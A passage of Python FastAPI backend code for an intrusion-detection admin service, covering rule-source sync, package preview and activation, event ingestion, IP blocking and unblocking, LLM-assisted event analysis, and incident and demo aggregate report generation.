        package_activation=activation_map.get(int(source.id)),
    )


@router.post("/sources/{source_id}/sync")
def trigger_ids_source_sync(
    source_id: int,
    req: SourceSyncRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    source = _get_source_or_404(db, source_id)
    triggered_by = (req.triggered_by or "").strip()[:64]
    reason = (req.reason or "").strip()[:500]
    if not triggered_by:
        raise HTTPException(status_code=400, detail="triggered_by is required")

    started_at = datetime.utcnow()
    result_status = SYNC_STATUS_SUCCESS
    detail = ""
    package_version = ""
    package_intake_id: int | None = None
    resolved_sync_endpoint = ""
    activation_required = False
    synced_rule_count = 0
    synced_artifact_path = ""
    synced_artifact_sha256 = ""

    if source.operational_status == SOURCE_STATUS_DISABLED:
        result_status = SYNC_STATUS_SKIPPED
        detail = _append_operator_note("Skipped because the source is disabled.", note=reason)
    elif source.operational_status == SOURCE_STATUS_DRAFT:
        result_status = SYNC_STATUS_SKIPPED
        detail = _append_operator_note("Skipped because the source is still in draft state.", note=reason)
    elif source.sync_mode == SYNC_MODE_NOT_APPLICABLE:
        result_status = SYNC_STATUS_SKIPPED
        detail = _append_operator_note("Skipped because sync is not applicable for this source.", note=reason)
    elif source.operational_status == SOURCE_STATUS_FAILING:
        result_status = SYNC_STATUS_FAILED
        detail = _append_operator_note(
            "Sync failed because the source is currently marked failing.",
            note=reason,
        )
    else:
        try:
            sync_payload = load_source_sync_payload(source)
            package_version = str(sync_payload.get("package_version") or "")[:64]
            resolved_sync_endpoint = str(sync_payload.get("manifest_path") or source.sync_endpoint or "")[:255]
            synced_rule_count = int(sync_payload.get("rule_count") or 0)
            synced_artifact_path = str(sync_payload.get("artifact_path") or "")[:255]
            synced_artifact_sha256 = str(sync_payload.get("artifact_sha256") or "")[:64]
            latest_activation_map = list_latest_package_activations(db, [int(source.id)])
            preview = build_package_preview_summary(
                source,
                package_version=package_version,
                release_timestamp=sync_payload.get("release_timestamp"),
                provenance_note=str(sync_payload.get("provenance_note") or ""),
                active_activation=latest_activation_map.get(int(source.id)),
                artifact_path=synced_artifact_path,
                artifact_sha256=synced_artifact_sha256,
                artifact_size_bytes=int(sync_payload.get("artifact_size_bytes") or 0),
                rule_count=synced_rule_count,
            )
            detail = _append_operator_note(str(sync_payload.get("sync_detail") or "Source sync completed."), note=reason)
            intake = IDSSourcePackageIntake(
                source_id=source.id,
                source_key=source.source_key or "",
                package_version=package_version,
                release_timestamp=sync_payload.get("release_timestamp"),
                trust_classification=str(sync_payload.get("trust_classification") or source.trust_classification or ""),
                detector_family=str(sync_payload.get("detector_family") or source.detector_family or ""),
                provenance_note=str(sync_payload.get("provenance_note") or ""),
                intake_result=PACKAGE_RESULT_PREVIEWED,
                intake_detail=f"{preview['version_change_state'] or 'synchronized'}: {detail}"[:1000],
                artifact_path=synced_artifact_path,
                artifact_sha256=synced_artifact_sha256,
                artifact_size_bytes=int(sync_payload.get("artifact_size_bytes") or 0),
                rule_count=synced_rule_count,
                triggered_by=triggered_by,
            )
            db.add(intake)
            db.flush()
            package_intake_id = int(intake.id)
            activation_required = (
                (preview.get("version_change_state") or "") != "unchanged"
                and (source.trust_classification or "").strip() != SOURCE_DEMO_TEST
            )
            source.last_synced_at = started_at
            source.last_sync_status = SYNC_STATUS_SUCCESS
            source.last_sync_detail = detail
        except SourceSyncValidationError as exc:
            result_status = SYNC_STATUS_FAILED
            detail = _append_operator_note(str(exc), note=reason)

    if result_status == SYNC_STATUS_SUCCESS:
        source.last_sync_status = SYNC_STATUS_SUCCESS
        source.last_sync_detail = detail
    else:
        if not source.last_sync_status:
            source.last_sync_status = SYNC_STATUS_NEVER
        source.last_sync_status = result_status
        source.last_sync_detail = detail

    health_state = derive_source_health_state(source, now=started_at)
    attempt = IDSSourceSyncAttempt(
        source_id=source.id,
        started_at=started_at,
        finished_at=started_at,
        result_status=result_status,
        detail=detail,
        freshness_after_sync=health_state,
        package_version=package_version,
        package_intake_id=package_intake_id,
        resolved_sync_endpoint=resolved_sync_endpoint or (source.sync_endpoint or ""),
        triggered_by=triggered_by,
    )
    db.add(attempt)
    db.flush()
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_source_sync",
        target_type="ids_source",
        target_id=str(source.id),
        detail=(
            f"Sync {result_status} for {source.source_key}; "
            f"package={package_version or '-'}; rules={synced_rule_count}; "
            f"endpoint={resolved_sync_endpoint or source.sync_endpoint or '-'}"
        ),
    )
    db.commit()
    db.refresh(source)
    db.refresh(attempt)

    activity_map = list_recent_source_activity(db, [source.source_key or ""])
    attempts_map = list_recent_sync_attempts(db, [int(source.id)])
    intake_map = list_recent_package_intakes(db, [int(source.id)])
    activation_map = list_latest_package_activations(db, [int(source.id)])
    serialized = _serialize_ids_source(
        source,
        activity=activity_map.get(source.source_key or ""),
        attempts=attempts_map.get(int(source.id), []),
        package_intakes=intake_map.get(int(source.id), []),
        package_activation=activation_map.get(int(source.id)),
    )
    return {
        "source_id": source.id,
        "sync_attempt_id": attempt.id,
        "result_status": attempt.result_status,
        "health_state": serialized["health_state"],
        "last_synced_at": serialized["last_synced_at"],
        "detail": attempt.detail or "",
        "package_version": package_version,
        "package_intake_id": package_intake_id,
        "resolved_sync_endpoint": resolved_sync_endpoint or (source.sync_endpoint or ""),
        "activation_required": activation_required,
        "rule_count": synced_rule_count,
        "artifact_path": synced_artifact_path,
        "artifact_sha256": synced_artifact_sha256,
        "change_summary": attempt.detail or "",
        "source": serialized,
    }


@router.post("/source-packages/preview")
def preview_ids_source_package(
    req: SourcePackagePreviewRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    source_key = normalize_source_key(req.source_key)
    package_version = (req.package_version or "").strip()[:64]
    trust_classification = (req.trust_classification or "").strip()
    detector_family = (req.detector_family or "").strip()[:32]
    provenance_note = (req.provenance_note or "").strip()[:2000]
    triggered_by = (req.triggered_by or "").strip()[:64]

    if not source_key:
        raise HTTPException(status_code=400, detail="source_key is required")
    if not package_version:
        raise HTTPException(status_code=400, detail="package_version is required")
    if trust_classification not in TRUST_CLASSIFICATIONS:
        raise HTTPException(status_code=400, detail=f"Invalid trust_classification: {trust_classification}")
    if not detector_family:
        raise HTTPException(status_code=400, detail="detector_family is required")
    if not triggered_by:
        raise HTTPException(status_code=400, detail="triggered_by is required")

    source = db.query(IDSSource).filter(IDSSource.source_key == source_key).first()
    if not source:
        intake = IDSSourcePackageIntake(
            source_id=None,
            source_key=source_key,
            package_version=package_version,
            release_timestamp=req.release_timestamp,
            trust_classification=trust_classification,
            detector_family=detector_family,
            provenance_note=provenance_note,
            intake_result=PACKAGE_RESULT_REJECTED,
            intake_detail=f"source_key not found: {source_key}",
            triggered_by=triggered_by,
        )
        db.add(intake)
        db.commit()
        raise HTTPException(status_code=400, detail=f"source_key not found: {source_key}")

    latest_activation_map = list_latest_package_activations(db, [int(source.id)])
    preview = build_package_preview_summary(
        source,
        package_version=package_version,
        release_timestamp=req.release_timestamp,
        provenance_note=provenance_note,
        active_activation=latest_activation_map.get(int(source.id)),
    )
    intake = IDSSourcePackageIntake(
        source_id=source.id,
        source_key=source_key,
        package_version=package_version,
        release_timestamp=req.release_timestamp,
        trust_classification=trust_classification,
        detector_family=detector_family,
        provenance_note=provenance_note,
        intake_result=PACKAGE_RESULT_PREVIEWED,
        intake_detail=preview["version_change_state"],
        triggered_by=triggered_by,
    )
    db.add(intake)
    db.flush()
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_package_preview",
        target_type="source_package",
        target_id=str(intake.id),
        detail=(
            f"Previewed package {package_version} for {source_key}; "
            f"change_state={preview['version_change_state']}"
        ),
    )
    db.commit()
    db.refresh(intake)
    return {
        "package_intake_id": intake.id,
        "source_id": preview["source_id"],
        "source_key": preview["source_key"],
        "package_version": preview["package_version"],
        "version_change_state": preview["version_change_state"],
        "changed_fields": preview["changed_fields"],
        "visible_warning": preview["visible_warning"],
        "intake_result": intake.intake_result,
    }


@router.post("/source-packages/activate")
def activate_ids_source_package(
    req: SourcePackageActivationRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    triggered_by = (req.triggered_by or "").strip()[:64]
    activation_note = (req.activation_note or "").strip()[:1000]
    if not triggered_by:
        raise HTTPException(status_code=400, detail="triggered_by is required")

    intake = db.query(IDSSourcePackageIntake).filter(IDSSourcePackageIntake.id == req.package_intake_id).first()
    if not intake:
        raise HTTPException(status_code=404, detail="Package intake not found")
    if intake.source_id is None:
        detail = _build_activation_failure_detail(
            "Rejected package previews cannot be activated",
            activation_note=activation_note,
        )
        _record_failed_package_activation(intake, detail=detail, triggered_by=triggered_by, db=db)
        raise HTTPException(status_code=400, detail="Rejected package previews cannot be activated")
    if (intake.trust_classification or "").strip() == SOURCE_DEMO_TEST:
        detail = _build_activation_failure_detail(
            "demo_test packages cannot be activated as trusted coverage",
            activation_note=activation_note,
        )
        _record_failed_package_activation(intake, detail=detail, triggered_by=triggered_by, db=db)
        raise HTTPException(status_code=400, detail="demo_test packages cannot be activated as trusted coverage")

    source = _get_source_or_404(db, int(intake.source_id))
    latest_activation_map = list_latest_package_activations(db, [int(source.id)])
    latest_activation = latest_activation_map.get(int(source.id))
    if latest_activation and (latest_activation.package_version or "") == (intake.package_version or ""):
        detail = activation_note or "Package version already active; activation re-recorded."
    else:
        detail = activation_note or "Reviewed package version activated."

    activation = IDSSourcePackageActivation(
        source_id=source.id,
        package_intake_id=intake.id,
        package_version=intake.package_version,
        activated_by=triggered_by,
        activation_detail=detail,
    )
    intake.intake_result = PACKAGE_RESULT_ACTIVATED
    intake.intake_detail = detail
    db.add(activation)
    db.flush()
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_package_activate",
        target_type="source_package",
        target_id=str(intake.id),
        detail=(
            f"Activated package {activation.package_version} for {source.source_key}; "
            f"activation_id={activation.id}"
        ),
    )
    db.commit()
    db.refresh(activation)
    _refresh_runtime_cache_safely(reason="package activation", source_key=source.source_key or "")

    return {
        "source_id": source.id,
        "package_activation_id": activation.id,
        "package_version": activation.package_version or "",
        "result_status": PACKAGE_RESULT_ACTIVATED,
        "active_package_version": activation.package_version or "",
        "detail": activation.activation_detail or "",
    }


@router.get("/source-packages")
def list_ids_source_packages(
    source_id: int | None = Query(None, ge=1),
    source_key: str | None = Query(None),
    limit: int = Query(5, ge=1, le=20),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    # Keep package-history queries source-scoped and bounded so reviewers can
    # inspect intake failures and trusted activations without leaving IDS.
    normalized_source_key = normalize_source_key(source_key or "")
    if source_id is not None:
        source = _get_source_or_404(db, source_id)
        intake_map = list_recent_package_intakes(db, [int(source.id)], limit_per_source=limit)
        activation_map = list_recent_package_activations(db, [int(source.id)], limit_per_source=limit)
        item = _build_source_package_history_item(
            source,
            intakes=intake_map.get(int(source.id), []),
            activations=activation_map.get(int(source.id), []),
        )
        return {"total": 1, "items": [item]}

    if normalized_source_key:
        source = db.query(IDSSource).filter(IDSSource.source_key == normalized_source_key).first()
        if source:
            intake_map = list_recent_package_intakes(db, [int(source.id)], limit_per_source=limit)
            activation_map = list_recent_package_activations(db, [int(source.id)], limit_per_source=limit)
            item = _build_source_package_history_item(
                source,
                intakes=intake_map.get(int(source.id), []),
                activations=activation_map.get(int(source.id), []),
            )
            return {"total": 1, "items": [item]}

        orphaned_intakes = (
            db.query(IDSSourcePackageIntake)
            .filter(IDSSourcePackageIntake.source_key == normalized_source_key)
            .filter(IDSSourcePackageIntake.source_id.is_(None))
            .order_by(IDSSourcePackageIntake.created_at.desc(), IDSSourcePackageIntake.id.desc())
            .limit(limit)
            .all()
        )
        if orphaned_intakes:
            return {
                "total": 1,
                "items": [
                    {
                        "source": None,
                        "source_key": normalized_source_key,
                        "active_package_version": "",
                        "active_package_activated_at": None,
                        "active_package_activated_by": "",
                        "recent_intakes": [_serialize_source_package_intake(intake) for intake in orphaned_intakes],
                        "recent_activations": [],
                    }
                ],
            }
        raise HTTPException(status_code=404, detail=f"source_key not found: {normalized_source_key}")

    rows = (
        db.query(IDSSource)
        .order_by(IDSSource.updated_at.desc(), IDSSource.id.desc())
        .all()
    )
    source_ids = [int(row.id) for row in rows]
    intake_map = list_recent_package_intakes(db, source_ids, limit_per_source=limit)
    activation_map = list_recent_package_activations(db, source_ids, limit_per_source=limit)
    items = [
        _build_source_package_history_item(
            row,
            intakes=intake_map.get(int(row.id), []),
            activations=activation_map.get(int(row.id), []),
        )
        for row in rows
    ]
    return {"total": len(items), "items": items}


@router.post("/events/ingest")
def ingest_ids_event(
    req: IngestEventRequest,
    db: Session = Depends(get_db),
    current_user: User | IntegrationPrincipal = Depends(_admin_or_integration),
):
    # Keep normalized event ingestion aligned with trusted-source provenance
    # without introducing registry-only demo/test source classes into events.
    allowed_origins = {REAL_EVENT_ORIGIN, DEMO_EVENT_ORIGIN, TEST_EVENT_ORIGIN}
    allowed_sources = {
        SOURCE_EXTERNAL_MATURE,
        SOURCE_CUSTOM_PROJECT,
        SOURCE_TRANSITIONAL_LOCAL,
    }
    event_origin = (req.event_origin or "").strip()
    source_classification = (req.source_classification or "").strip()
    detector_family = (req.detector_family or "").strip()
    detector_name = (req.detector_name or "").strip()
    attack_type = (req.attack_type or "").strip()

    if event_origin not in allowed_origins:
        raise HTTPException(status_code=400, detail=f"Invalid event_origin: {event_origin}")
    if source_classification not in allowed_sources:
        raise HTTPException(status_code=400, detail=f"Invalid source_classification: {source_classification}")
    if not detector_family or not detector_name or not attack_type:
        raise HTTPException(status_code=400, detail="detector_family, detector_name, and attack_type are required")
    if event_origin in {REAL_EVENT_ORIGIN, DEMO_EVENT_ORIGIN} and not (req.event_fingerprint or "").strip():
        raise HTTPException(status_code=400, detail="event_fingerprint is required for real and demo events")
    if req.raw_evidence is None and not (req.evidence_summary or "").strip():
        raise HTTPException(status_code=400, detail="evidence_summary is required when raw_evidence is omitted")

    raw_evidence = req.raw_evidence or IngestRawEvidence()
    method = (raw_evidence.method or "").strip().upper()
    path = (raw_evidence.path or req.asset_ref or "").strip()
    event_fingerprint = (
        (req.event_fingerprint or "").strip()
        or build_event_fingerprint(req.client_ip, method, path, attack_type, req.rule_id)
    )
    correlation_key = (
        (req.correlation_key or "").strip()
        or build_correlation_key(req.occurred_at, req.client_ip, attack_type, detector_name)
    )
    matched = _find_correlated_ingested_event(
        db,
        event_origin=event_origin,
        event_fingerprint=event_fingerprint,
        correlation_key=correlation_key,
        occurred_at=req.occurred_at,
    )
    created_new_event = False

    if matched:
        _merge_ingested_event(
            matched,
            req=req,
            raw_evidence=raw_evidence,
            event_fingerprint=event_fingerprint,
            correlation_key=correlation_key,
        )
        db.commit()
        db.refresh(matched)
        incident = matched
    else:
        created_new_event = True
        is_blocked = bool(req.blocked)
        response_result = (req.response_result or "").strip()[:32] or ("success" if is_blocked else "record_only")
        action_taken = (req.action_taken or "").strip()[:128] or f"ingested::{source_classification}"
        incident = IDSEvent(
            client_ip=(req.client_ip or "")[:64],
            attack_type=attack_type,
            signature_matched=((req.rule_name or req.rule_id or req.evidence_summary or attack_type)[:128]),
            method=method[:16],
            path=path[:512],
            query_snippet=(raw_evidence.query_snippet or "")[:500],
            body_snippet=(raw_evidence.body_snippet or "")[:500],
            user_agent=(raw_evidence.user_agent or "")[:512],
            headers_snippet=(raw_evidence.headers_snippet or "")[:1000],
            blocked=1 if is_blocked else 0,
            firewall_rule=(req.firewall_rule or "")[:256],
            archived=0,
            status="new",
            review_note="",
            action_taken=action_taken,
            response_result=response_result,
            response_detail=((req.evidence_summary or "normalized_ingest")[:1000]),
            risk_score=_severity_to_risk_score(req.severity, req.confidence),
            confidence=int(req.confidence or 0),
            hit_count=1,
            detect_detail=_build_ingested_detect_detail(req, raw_evidence),
        )
        incident.created_at = req.occurred_at
        apply_source_metadata(
            incident,
            event_origin=event_origin,
            source_classification=source_classification,
            detector_family=detector_family,
            detector_name=detector_name,
            source_rule_id=req.rule_id,
            source_rule_name=req.rule_name,
            source_version=req.source_version,
            source_freshness=req.source_freshness,
            occurred_at=req.occurred_at,
            event_fingerprint=event_fingerprint,
            correlation_key=correlation_key,
        )
        db.add(incident)
        db.commit()
        db.refresh(incident)

    actor_label = _ids_audit_user_name(current_user)
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_event_ingest",
        target_type="ids_event",
        target_id=str(incident.id),
        detail=(
            f"Ingested IDS event {incident.id} via {actor_label}; "
            f"origin={event_origin}; detector={detector_name}; attack={attack_type}."
        )[:512],
    )
    db.commit()

    if created_new_event:
        auto_dispatch_notifications_for_event(
            db,
            serialize_notification_event(incident),
            source="site_event_ingest",
        )
        db.commit()

    return {
        "incident_id": incident.id,
        "correlation_key": incident.correlation_key or correlation_key,
        "linked_event_count": int(incident.hit_count or 1),
        "counted_in_real_metrics": (incident.event_origin or REAL_EVENT_ORIGIN) == REAL_EVENT_ORIGIN,
        "status": incident.status or "new",
    }


@router.put("/events/{event_id}/archive")
def archive_event(
    event_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    evt.archived = 1
    evt.status = "closed"
    evt.response_result = "success"
    evt.response_detail = "archived_by_operator"
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_event_archive",
        target_type="ids_event",
        target_id=str(evt.id),
        detail=f"Archived IDS event {evt.id} from {evt.client_ip} ({evt.attack_type}).",
    )
    db.commit()
    return {"code": 200, "message": "Event archived"}


@router.post("/events/{event_id}/analyze")
def analyze_event_ai(
    event_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    if not settings.IDS_AI_ANALYSIS:
        raise HTTPException(status_code=400, detail="IDS_AI_ANALYSIS is disabled")
    if not is_llm_available():
        raise HTTPException(status_code=400, detail="No supported LLM configuration is available")
    _get_event_or_404(db, event_id)
    run_ai_analysis_sync(event_id)
    evt = _get_event_or_404(db, event_id)
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_event_ai_analyze",
        target_type="ids_event",
        target_id=str(evt.id),
        detail=(
            f"Ran AI analysis for IDS event {evt.id}; "
            f"risk={evt.ai_risk_level or 'unknown'}; confidence={int(evt.ai_confidence or 0)}"
        ),
    )
    db.commit()
    return {
        "code": 200,
        "message": "AI analysis completed",
        "ai_risk_level": evt.ai_risk_level or "",
        "ai_analysis": (evt.ai_analysis or "")[:4000],
        "ai_confidence": int(evt.ai_confidence or 0),
        "ai_analyzed_at": evt.ai_analyzed_at.strftime("%Y-%m-%d %H:%M:%S") if evt.ai_analyzed_at else None,
    }


@router.put("/events/{event_id}/status")
def update_event_status(
    event_id: int,
    req: UpdateStatusRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    allowed = {"new", "investigating", "mitigated", "false_positive", "closed"}
    status = (req.status or "").strip()
    if status not in allowed:
        raise HTTPException(status_code=400, detail=f"Invalid status: {status}")
    evt = _get_event_or_404(db, event_id)
    evt.status = status
    evt.review_note = (req.review_note or "")[:2000]
    evt.response_result = "success"
    evt.response_detail = f"status_updated::{status}"
    if status == "false_positive":
        record_false_positive_learning(
            evt,
            learned_by=current_user.username or current_user.real_name or "ids_admin",
            review_note=evt.review_note or "",
        )
        _log_ids_audit(
            db,
            user=current_user,
            action="ids_false_positive_learn",
            target_type="ids_event",
            target_id=str(evt.id),
            detail=f"Recorded false-positive learning for IDS event {evt.id}.",
        )
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_event_status_update",
        target_type="ids_event",
        target_id=str(evt.id),
        detail=f"Updated IDS event {evt.id} to status={status}.",
    )
    db.commit()
    return {"code": 200, "message": "Status updated", "status": evt.status}


@router.post("/events/{event_id}/block")
def block_event_ip(
    event_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    client_ip = evt.client_ip or ""
    actor = current_user.username or getattr(current_user, "name", "") or "admin"
    app_ok, app_msg = add_blocked_ip(client_ip, source="manual_block", event_id=evt.id, actor=actor)
    firewall_ok, firewall_msg = block_ip_windows(client_ip)
    result = _build_ip_action_result(
        action="block",
        client_ip=client_ip,
        app_ok=app_ok,
        app_message=app_msg,
        firewall_ok=firewall_ok,
        firewall_message=firewall_msg,
    )
    if result["ok"]:
        evt.blocked = 1
    evt.firewall_rule = (firewall_msg if firewall_ok else "")[:256]
    evt.action_taken = "manual_block" if result["ok"] else "manual_block_failed"
    evt.response_result = "success" if result["ok"] else "failed"
    evt.response_detail = str(result["detail"])[:1000]
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_event_block",
        target_type="ids_event",
        target_id=str(evt.id),
        detail=f"Block {'succeeded' if result['ok'] else 'failed'} for {evt.client_ip}: {str(result['detail'])[:220]}",
    )
    db.commit()
    return {
        "code": 200,
        "message": result["message"],
        "ok": result["ok"],
        "detail": result["detail"],
        "rule": firewall_msg if firewall_ok else "",
        "app_blocked": app_ok,
        "firewall_ok": firewall_ok,
    }


@router.post("/events/{event_id}/unblock")
def unblock_event_ip(
    event_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    client_ip = evt.client_ip or ""
    app_ok, app_msg = remove_blocked_ip(client_ip)
    firewall_ok, firewall_msg = unblock_ip_windows(client_ip)
    result = _build_ip_action_result(
        action="unblock",
        client_ip=client_ip,
        app_ok=app_ok,
        app_message=app_msg,
        firewall_ok=firewall_ok,
        firewall_message=firewall_msg,
    )
    if result["ok"]:
        evt.blocked = 0
    evt.firewall_rule = "" if result["ok"] else evt.firewall_rule
    evt.action_taken = "manual_unblock" if result["ok"] else "manual_unblock_failed"
    evt.response_result = "success" if result["ok"] else "failed"
    evt.response_detail = str(result["detail"])[:1000]
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_event_unblock",
        target_type="ids_event",
        target_id=str(evt.id),
        detail=f"Unblock {'succeeded' if result['ok'] else 'failed'} for {evt.client_ip}: {str(result['detail'])[:220]}",
    )
    db.commit()
    return {
        "code": 200,
        "message": result["message"],
        "ok": result["ok"],
        "detail": result["detail"],
        "app_unblocked": app_ok,
        "firewall_ok": firewall_ok,
    }


@router.get("/events/{event_id}/report")
def get_event_report(
    event_id: int,
    force_ai: int = Query(0),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = _get_event_or_404(db, event_id)
    if force_ai == 1 and settings.IDS_AI_ANALYSIS and is_llm_available():
        run_ai_analysis_sync(event_id)
        evt = _get_event_or_404(db, event_id)

    hits = _extract_event_hits(evt)
    packet = _build_request_packet(evt)
    ai_meta = _ai_status(evt)
    decision_basis = _decision_basis(evt, hits)
    upload_trace = _extract_upload_trace(evt)
    report = {
        "event_id": evt.id,
        "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "overview": {
            "time": evt.created_at.strftime("%Y-%m-%d %H:%M:%S") if evt.created_at else "",
            "client_ip": evt.client_ip,
            "attack_type": evt.attack_type,
            "attack_type_label": _attack_type_label(evt.attack_type),
            "method": evt.method,
            "path": evt.path,
            "status": evt.status or "new",
            "event_origin": evt.event_origin or REAL_EVENT_ORIGIN,
            "detector_name": evt.detector_name or "",
        },
        "score": {
            "risk_score": int(evt.risk_score or 0),
            "rule_confidence": int(evt.confidence or 0),
            "hit_count": int(evt.hit_count or 0),
            "ai_risk_level": evt.ai_risk_level or "",
            "ai_confidence": int(evt.ai_confidence or 0),
        },
        "evidence": {
            "signature": evt.signature_matched or "",
            "query_snippet": (evt.query_snippet or "")[:500],
            "body_snippet": (evt.body_snippet or "")[:500],
            "user_agent": (evt.user_agent or "")[:500],
        },
        "packet": packet,
        "matched_hits": hits,
        "decision_basis": decision_basis,
        "ai_status": ai_meta,
        "response": {
            "blocked": bool(evt.blocked),
            "firewall_rule": evt.firewall_rule or "",
            "action_taken": evt.action_taken or "",
            "review_note": evt.review_note or "",
            "response_result": evt.response_result or "",
            "response_detail": evt.response_detail or "",
        },
        "provenance": {
            "source_classification": evt.source_classification or "",
            "detector_family": evt.detector_family or "",
            "detector_name": evt.detector_name or "",
            "source_rule_id": evt.source_rule_id or "",
            "source_rule_name": evt.source_rule_name or "",
            "source_version": evt.source_version or "",
            "source_freshness": evt.source_freshness or "",
        },
        "upload_trace": upload_trace,
        "ai_analysis": evt.ai_analysis or "",
    }
    matched_rule_lines = "".join(
        (
            f"- {hit.get('source_rule_id') or '-'} / {hit.get('source_rule_name') or '-'} "
            f"[{hit.get('detector_name') or '-'} {hit.get('source_version') or '-'}] "
            f"matched {hit.get('matched_part') or 'request'} => {hit.get('matched_value') or hit.get('signature_matched') or '-'}\n"
        )
        for hit in hits[:8]
    ) or "- No structured hit chain captured.\n"
    markdown = (
        "# IDS Incident Report\n\n"
        f"- Event ID: {evt.id}\n"
        f"- Time: {report['overview']['time']}\n"
        f"- Client IP: {evt.client_ip}\n"
        f"- Type: {_attack_type_label(evt.attack_type)} ({evt.attack_type})\n"
        f"- Origin: {evt.event_origin or REAL_EVENT_ORIGIN}\n"
        f"- Detector: {evt.detector_name or '-'}\n"
        f"- Path: {evt.method} {evt.path}\n"
        f"- Risk Score: {int(evt.risk_score or 0)} / 100\n"
        f"- Block Threshold: {int(settings.IDS_BLOCK_THRESHOLD)} / 100\n"
        f"- Confidence: {int(evt.confidence or 0)} / 100\n"
        f"- Hit Count: {int(evt.hit_count or 0)}\n"
        f"- Blocked: {'yes' if evt.blocked else 'no'}\n"
        f"- Firewall Rule: {evt.firewall_rule or '-'}\n\n"
        "## Decision Basis\n"
        f"- Final Source: {decision_basis.get('final_source')}\n"
        f"- Static Source: {decision_basis.get('static_source_label')}\n"
        f"- Analysis Mode: {decision_basis.get('analysis_mode_label')}\n"
        f"- Mode Reason: {decision_basis.get('mode_reason')}\n"
        f"- AI Available: {'yes' if ai_meta.get('ai_available') else 'no'}\n"
        f"- LLM Used: {'yes' if ai_meta.get('llm_used') else 'no'}\n\n"
        "## Evidence\n"
        f"- Signature: {evt.signature_matched or '-'}\n"
        f"- Query: {(evt.query_snippet or '-')[:500]}\n"
        f"- Body: {(evt.body_snippet or '-')[:500]}\n"
        f"- Headers: {(evt.headers_snippet or '-')[:500]}\n"
        f"- User-Agent: {(evt.user_agent or '-')[:300]}\n\n"
        "## Matched Static Rules\n"
        f"{matched_rule_lines}\n"
        "## Attack Packet\n"
        "```http\n"
        f"{packet.get('raw_request') or '-'}\n"
        "```\n\n"
        + (
            "## Upload Audit Trace\n"
            f"- Saved As: {upload_trace.get('saved_as') or '-'}\n"
            f"- Original Name: {upload_trace.get('file_name') or '-'}\n"
            f"- Audit Verdict: {((upload_trace.get('audit') or {}).get('verdict')) or '-'}\n"
            f"- Audit Risk: {((upload_trace.get('audit') or {}).get('risk_level')) or '-'}\n"
            f"- Audit Confidence: {int(((upload_trace.get('audit') or {}).get('confidence')) or 0)}\n"
            f"- Analysis Mode: {((upload_trace.get('audit') or {}).get('analysis_mode_label')) or '-'}\n"
            f"- Summary: {((upload_trace.get('audit') or {}).get('summary')) or '-'}\n\n"
            if upload_trace
            else ""
        )
        + "## AI Analysis\n"
        + f"- Risk Level: {evt.ai_risk_level or 'unknown'}\n"
        + f"- AI Confidence: {int(evt.ai_confidence or 0)}\n"
        + f"- Analysis Mode: {ai_meta.get('analysis_mode_label')}\n\n"
        + f"{evt.ai_analysis or 'AI is not configured or analysis has not been run for this blocked request.'}\n"
    )
    return {"report": report, "markdown": markdown}


@router.get("/demo/phase1/aggregate-report")
def get_phase1_aggregate_report(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    rows = (
        db.query(IDSEvent)
        .filter(IDSEvent.action_taken.like("demo_seed_phase1::%"))
        .order_by(IDSEvent.id.asc())
        .all()
    )
    if not rows:
        raise HTTPException(status_code=404, detail="No phase1 demo events found")

    ips = sorted({row.client_ip or "" for row in rows if row.client_ip})
    attack_labels: list[str] = []
    for row in rows:
        label = _attack_type_label(row.attack_type)
        if label not in attack_labels:
            attack_labels.append(label)

    max_score = max(int(row.risk_score or 0) for row in rows)
    max_conf = max(int(row.confidence or 0) for row in rows)
    blocked_count = sum(1 for row in rows if row.blocked)
    total_hits = sum(int(row.hit_count or 0) for row in rows)
    first_time = rows[0].created_at.strftime("%Y-%m-%d %H:%M:%S") if rows[0].created_at else ""
    by_attack = Counter((row.attack_type or "") for row in rows)

    return {
        "report": {
            "kind": "aggregate_phase1",
            "event_id": rows[0].id,
            "event_count": len(rows),
            "attack_type_labels": attack_labels,
            "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
            "overview": {
                "time": first_time,
                "client_ip": ", ".join(ips[:6]) if ips else "-",
                "attack_type": "multi_vector",
                "attack_type_label": "Multi-vector demo chain",
                "method": "GET/POST",
                "path": "multiple endpoints",
                "status": "investigating",
            },
            "score": {
                "risk_score": max_score,
                "rule_confidence": max_conf,
                "hit_count": total_hits,
                "ai_risk_level": "high",
                "ai_confidence": min(99, max(88, max_conf - 2)),
            },
            "evidence": {
                "signature": "aggregate::demo_seed_phase1",
                "query_snippet": f"{len(rows)} demo events across {', '.join(attack_labels)}",
                "body_snippet": "See vector details in report",
                "user_agent": "RedTeam-AutoScanner/1.0",
            },
            "response": {
                "blocked": blocked_count > 0,
                "firewall_rule": f"IDS-Aggregate-{len(rows)}evt",
                "action_taken": "aggregate_investigation",
                "review_note": "Aggregated demo phase1 chain",
            },
            "analysis_json": {
                "report_type": "ids_ai_aggregate",
                "scenario": "multi_vector_concurrent_attack",
                "engine": "IDS_RULE_ENGINE + LLM_ASSIST",
                "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
                "summary": {
                    "total_events": len(rows),
                    "unique_source_ips": len(ips),
                    "peak_risk_score": max_score,
                    "blocked_count": blocked_count,
                    "aggregate_risk_level": "high",
